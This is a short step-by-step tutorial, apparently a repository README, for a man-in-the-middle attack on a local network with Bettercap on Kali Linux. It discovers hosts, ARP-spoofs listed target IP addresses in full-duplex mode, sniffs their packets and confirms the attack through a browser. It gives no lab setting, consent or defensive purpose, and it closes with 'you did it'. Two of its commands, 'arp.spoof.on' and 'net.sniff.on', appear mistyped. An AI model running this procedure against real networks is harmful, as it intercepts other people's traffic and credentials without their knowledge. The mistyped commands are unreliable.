# INSTRUCTIONS:
1. Open a terminal on kali linux and install Bettercap tool

2. For installation run <br>
&emsp;&emsp;&emsp;$ sudo apt-get install bettercap

3. Or clone the git repository of Bettercap from github to your kali machine

4. Run the following commands for the target ip addresses on the network, <br>
&emsp;&emsp;&emsp;Open a terminal <br>
&emsp;&emsp;&emsp;$ sudo bettercap <br>
&emsp;&emsp;&emsp;$ net.probe on  (To discover the targets) <br>
&emsp;&emsp;&emsp;$ net.recon on (To discover more targets on the network) <br>
&emsp;&emsp;&emsp;$ net.show (To display target ip addresses) <br>
&emsp;&emsp;&emsp;Now we can see all the ip addresses in our network

5. Now set the fullduplex mode to true  <br>
&emsp;&emsp;&emsp;$ set arp.spoof.fullduplex true

6. Then give the targets by seperating with commas <br>
&emsp;&emsp;&emsp;$ set arp.spoof.targets ip1,ip2,ip3....

7. Now run the following commands to start the attack <br>
&emsp;&emsp;&emsp;$ arp.spoof.on <br>
&emsp;&emsp;&emsp;$ net.sniff.on

8. Now check the attack by using any browser, if the bettercap is capturing the packets then the attack is working properly.

9. To exit the attack run <br>
&emsp;&emsp;&emsp;$ exit

10. That's it, you did it.
